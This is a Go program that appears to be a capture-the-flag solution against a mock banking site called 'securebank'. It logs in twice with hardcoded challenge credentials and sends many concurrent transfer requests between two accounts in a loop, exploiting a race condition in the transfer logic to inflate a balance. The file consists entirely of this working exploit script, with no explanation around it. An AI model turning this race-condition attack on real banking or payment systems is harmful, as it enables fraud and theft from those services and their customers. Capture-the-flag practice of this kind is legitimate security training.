package main

import (
	"fmt"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"
)

const baseurl = "https://ab42be93930e63f2415308b9-securebank.challenge.master.cscg.live:31337/index.php?page="

type cli struct {
	client *http.Client
}

func (cli *cli) DoLogin() {
	req, err := http.NewRequest("POST", baseurl+"login", strings.NewReader("username=john&password=johndoe"))
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}

	resp, err := cli.client.Do(req)
	if err != nil {
		log.Fatalf("Error occured. Error is: %s", err.Error())
	}

	url, err := url.Parse(baseurl)

	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}

	cli.client.Jar.SetCookies(url, resp.Cookies())
}

func (cli *cli) DoTransfer(source, dest, amount string) {
	body := strings.NewReader(fmt.Sprintf("source=%s&destination=%s&amount=%s", source, dest, amount))
	req, err := http.NewRequest("POST", baseurl+"transfer", body)
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}
	_, err = cli.client.Do(req)

	if err != nil {
		log.Fatalf("Error occured. Error is: %s", err.Error())
	}

}

func main() {

	savingsAccount := "EU88SECB00051380017"
	transactionAccount := "EU42SECB00051380016"

	jar1, _ := cookiejar.New(nil)
	cli1 := &cli{&http.Client{Jar: jar1}}

	jar2, _ := cookiejar.New(nil)
	cli2 := &cli{&http.Client{Jar: jar2}}

	cli1.DoLogin()
	cli2.DoLogin()

	for j := 0; j < 10; j++ {
		cli1.DoTransfer(transactionAccount, savingsAccount, "20")
		for i := 0; i < 4; i++ {
			fmt.Print("Time: ", time.Now().UnixMilli(), "\n")
			go func() {
				cli1.DoTransfer(savingsAccount, transactionAccount, "10")
			}()
			go func() {
				cli2.DoTransfer(savingsAccount, transactionAccount, "10")
			}()
		}
		fmt.Println("Sleeping")
		time.Sleep(time.Second * 2)
	}
	cli1.DoTransfer(transactionAccount, savingsAccount, "50")
}
